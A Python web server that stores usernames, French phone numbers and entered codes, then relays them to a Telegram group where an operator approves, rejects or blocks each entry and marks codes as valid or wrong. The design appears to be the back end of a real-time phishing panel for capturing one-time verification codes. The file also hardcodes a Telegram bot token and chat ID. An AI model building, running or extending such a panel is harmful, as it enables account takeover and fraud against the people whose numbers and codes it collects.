import http.server, json, os, time, threading, urllib.request, urllib.parse
from urllib.request import urlopen, Request

TOKEN=os.environ.get("TG_TOKEN","8614076867:AAGAOpdy6Zwr6j-EHkQAUSiOnggXicPxsBQ")
CHAT=os.environ.get("TG_CHAT","-1004318289180")
PENDING_FILE="pending.json"
BLOCKED_FILE="blocked.json"
OFFSET_FILE="tg_offset.txt"

def load_json(p, d):
    try:
        with open(p,"r",encoding="utf-8") as f: return json.load(f)
    except: return d

def save_json(p, v):
    with open(p,"w",encoding="utf-8") as f: json.dump(v,f)

def tg_api(method, data):
    try:
        req=Request(f"https://api.telegram.org/bot{TOKEN}/{method}", data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
        with urlopen(req, timeout=10) as r: return json.loads(r.read().decode())
    except Exception as e: print("tg err",e); return None

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/api/pending"):
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            self.wfile.write(json.dumps(load_json(PENDING_FILE,[])).encode())
            return
        if self.path.startswith("/api/blocked"):
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            self.wfile.write(json.dumps(load_json(BLOCKED_FILE,[])).encode())
            return
        if self.path.startswith("/api/likes"):
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            self.wfile.write(json.dumps({"likes":load_json("likes.json",{}),"liked":load_json("liked.json",{})}).encode())
            return
        if self.path.startswith("/api/images"):
            self.send_response(200); self.send_header("Content-Type","application/json"); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            self.wfile.write(json.dumps(load_json("images.json",[])).encode())
            return
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
        length=int(self.headers.get('Content-Length',0))
        body=self.rfile.read(length).decode() if length else "{}"
        try: data=json.loads(body)
        except: data={}
        if self.path=="/api/pending":
            pend=load_json(PENDING_FILE,[])
            pend.append(data)
            save_json(PENDING_FILE,pend)
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b'{"ok":true}')
            return
        if self.path=="/api/pending/update":
            pend=load_json(PENDING_FILE,[])
            for p in pend:
                if p["id"]==data.get("id"):
                    for k,v in data.items():
                        if k!="id": p[k]=v
                    if "status" not in data: p["status"]="pending"
            save_json(PENDING_FILE,pend)
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b'{"ok":true}')
            return
        if self.path=="/api/block":
            ph=data.get("phone")
            blocked=load_json(BLOCKED_FILE,[])
            if ph not in blocked: blocked.append(ph)
            save_json(BLOCKED_FILE,blocked)
            pend=load_json(PENDING_FILE,[])
            pend=[p for p in pend if p["phone"]!=ph]
            save_json(PENDING_FILE,pend)
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b'{"ok":true}')
            return
        if self.path=="/api/telegram/send":
            text=data.get("text",""); pid=data.get("pid"); kb=data.get("reply_markup")
            payload={"chat_id":CHAT,"message_thread_id":2,"text":text,"parse_mode":"HTML"}
            if kb: payload["reply_markup"]=kb
            tg_api("sendMessage",payload)
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b'{"ok":true}')
            return
        if self.path=="/api/likes":
            if "likes" in data: save_json("likes.json", data["likes"])
            if "liked" in data: save_json("liked.json", data["liked"])
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b'{"ok":true}')
            return
        if self.path=="/api/images":
            save_json("images.json", data if isinstance(data, list) else data.get("images",[]))
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b'{"ok":true}')
            return
        self.send_response(404); self.end_headers()
    def do_OPTIONS(self):
        self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS"); self.send_header("Access-Control-Allow-Headers","Content-Type"); self.end_headers()

def poll_telegram():
    offset=0
    try: offset=int(open(OFFSET_FILE).read().strip())
    except: offset=0
    while True:
        try:
            with urlopen(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset+1}&timeout=5", timeout=15) as r:
                j=json.loads(r.read().decode())
                if j.get("ok"):
                    for u in j.get("result",[]):
                        offset=u["update_id"]
                        open(OFFSET_FILE,"w").write(str(offset))
                        cb=u.get("callback_query")
                        if not cb: continue
                        data=cb.get("data","")
                        mid=cb["message"]["message_id"]; chat=cb["message"]["chat"]["id"]
                        try: pid=int(data.split("_")[-1])
                        except: continue
                        pend=load_json(PENDING_FILE,[])
                        item=next((x for x in pend if x["id"]==pid), None)
                        if not item: continue
                        if data.startswith("approve_"):
                            item["status"]="approved"
                            save_json(PENDING_FILE,pend)
                            tg_api("answerCallbackQuery",{"callback_query_id":cb["id"],"text":"✅ Validé"})
                            tg_api("editMessageText",{"chat_id":chat,"message_id":mid,"message_thread_id":2,"text":f"✅ Validé: {item['username']} +33 {item['phone']}"})
                        elif data.startswith("reject_"):
                            item["status"]="rejected"
                            save_json(PENDING_FILE,pend)
                            tg_api("answerCallbackQuery",{"callback_query_id":cb["id"],"text":"❌ Refusé"})
                            tg_api("editMessageText",{"chat_id":chat,"message_id":mid,"message_thread_id":2,"text":f"❌ Refusé: {item['username']} +33 {item['phone']}"})
                        elif data.startswith("block_"):
                            blocked=load_json(BLOCKED_FILE,[])
                            if item["phone"] not in blocked: blocked.append(item["phone"])
                            save_json(BLOCKED_FILE,blocked)
                            pend=[x for x in pend if x["id"]!=pid]
                            save_json(PENDING_FILE,pend)
                            tg_api("answerCallbackQuery",{"callback_query_id":cb["id"],"text":"🚫 Bloqué"})
                            tg_api("editMessageText",{"chat_id":chat,"message_id":mid,"message_thread_id":2,"text":f"🚫 Bloqué: {item['username']} +33 {item['phone']}"})
                        elif data.startswith("code_ok_"):
                            item["status"]="approved_final"
                            save_json(PENDING_FILE,pend)
                            tg_api("answerCallbackQuery",{"callback_query_id":cb["id"],"text":"✅ Code OK"})
                            tg_api("editMessageText",{"chat_id":chat,"message_id":mid,"message_thread_id":2,"text":f"✅ Code OK: {item['username']} +33 {item['phone']} code {item.get('enteredCode','')}"})
                        elif data.startswith("code_bad_"):
                            item["status"]="rejected"
                            save_json(PENDING_FILE,pend)
                            tg_api("answerCallbackQuery",{"callback_query_id":cb["id"],"text":"❌ Code faux"})
                            tg_api("editMessageText",{"chat_id":chat,"message_id":mid,"message_thread_id":2,"text":f"❌ Code faux: {item['username']} +33 {item['phone']} saisi {item.get('enteredCode','')}"})
        except Exception as e: print(e)
        time.sleep(2)

threading.Thread(target=poll_telegram, daemon=True).start()
port=int(os.environ.get("PORT", 8000))
print(f"Server on {port} with Telegram polling")
http.server.test(HandlerClass=Handler, port=port)
